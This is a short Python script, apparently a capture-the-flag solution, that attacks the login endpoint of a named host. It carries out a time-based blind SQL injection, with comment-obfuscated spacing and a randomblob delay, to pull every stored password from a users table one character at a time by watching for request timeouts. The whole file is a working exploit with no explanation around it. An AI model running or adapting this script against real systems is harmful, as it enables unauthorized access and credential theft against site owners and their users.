import requests

url = 'http://node.vnteam.cn:48743/login'
flag = ''
for i in range(1, 500):
    low = 32
    high = 128
    mid = (low + high) // 2
    while low < high:
        payload = 'select/**/group_concat(password)/**/from/**/users'
        password = f"'or/**/(case/**/when(substr(({payload}),{i},1)>'{chr(mid)}')/**/then/**/randomblob(1000000000)/**/else/**/0/**/end)--"
        json = {"username": 'nailong', "password": password}
        try:
            res = requests.post(url=url, json=json, timeout=2)
        except Exception:
            low = mid + 1
        else:
            high = mid
        mid = (low + high) // 2
    if (mid == 32 or mid == 127):
        break
    flag = flag+chr(mid)
    print(flag)
